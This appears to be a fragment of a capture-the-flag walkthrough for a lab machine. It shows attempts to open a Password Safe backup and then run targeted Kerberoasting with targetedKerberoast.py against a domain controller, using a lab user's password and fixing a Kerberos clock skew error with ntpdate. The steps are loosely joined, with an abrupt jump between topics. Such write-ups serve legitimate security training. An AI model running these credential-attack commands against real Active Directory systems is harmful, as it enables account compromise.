Foothold

.psafe3 is a securely encrypted database file used by the Password Safe password manager. We can open this file with pwsafe client.

└─$ pwsafe Backup.psafe3

However, it requires master password to open this file.
Thus, we need to crack the master password for password safe file.

└─$ hashcat -h | grep -i 'password safe'

In this scenario, we can perform Targeted Kerberoasting. For that purpose, there is great tool : targetedKerberoast.py

└─$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
└─$ cd targetedKerberoast

However, when we run the code like below, we face error Clock skew too great.

└─$ python3 targetedKerberoast.py --dc-ip 10.129.27.133 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

This means the time settings between us and the target machine is too far. Since Kerberos is very time sensitive you should configure your client machines to use one of your domain controllers as an NTP server.

To use the same time with the target, we use 2 tools.

└─$ sudo ntpdate administrator.htb

This returned the time 2025-11-10 11:46:30, but my VM is pointing 4:47. We need to use 2025-11-10 11:46:30 for requesting.
